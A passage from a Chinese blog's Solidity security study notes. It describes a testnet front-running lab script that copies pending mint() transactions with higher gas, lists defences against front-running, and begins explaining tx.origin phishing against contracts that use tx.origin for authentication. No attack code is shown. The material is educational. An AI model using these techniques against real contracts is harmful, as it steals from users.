<p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p>
<p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p>
<p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p>
<h2 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p>
<ul>
<li>使用预提交方案(commit-reveal scheme)。</li>
<li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li>
<li>在调用参数中加上保护性参数，如<a target="_blank" rel="noopener" href="https://uniswapv3book.com/milestone_3/slippage-protection.html">滑点保护</a>，从而减少抢跑者的潜在收益。</li>
</ul>
<p>具体操作步骤可以看<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">WTF Solidity 合约安全: S11. 抢先交易</a></p>
<h1 id="S12-tx-origin钓鱼攻击"><a href="#S12-tx-origin钓鱼攻击" class="headerlink" title="S12. tx.origin钓鱼攻击"></a>S12. tx.origin钓鱼攻击</h1><p>上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来自己饿使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与<code>tx.origin</code>钓鱼攻击有着异曲同工之妙。</p>
<p>在<code>solidity</code>中，使用<code>tx.origin</code>可以获得启动交易的原始地址，它与<code>msg.sender</code>十分相似，下面我们用一个例子来区分它们之间不同的地方。</p>
<p>如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A。如果你不了解<code>call</code>的机制，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">WTF Solidity极简教程第22讲：Call</a>。</p>
<p><img src="/img/web3/S12_1.jpg" srcset="/img/loading.gif" lazyload alt="S12-1"></p>
<p>因此如果一个银行合约使用了<code>tx.origin</code>做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使<code>msg.sender</code>是攻击合约地址，但<code>tx.origin</code>是银行合约拥有者地址，那么转账就有可能成功。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>08-9Solidity笔记之十合约安全项</div>
      <div>http://example.com/2025/08/21/08-9Solidity笔记之十合约安全项/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Wangxiaowang</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年8月21日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/08/22/after/" title="">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile"></span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/14/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B9%9D/" title="08-9Solidity笔记之九闪电贷套利">
                        <span class="hidden-mobile">08-9Solidity笔记之九闪电贷套利</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"QE69Ypw2FdG2cP7zRWgtj8ii-gzGzoHsz","appKey":"p8TvvzGc2rQ02TfZHuJppQLO","path":"window.location.pathname","placeholder":"欢迎留下评论，嘿嘿！","avatar":"monsterid","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appid":"QE69Ypw2FdG2cP7zRWgtj8ii-gzGzoHsz","appkey":"p8TvvzGc2rQ02TfZHuJppQLO"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
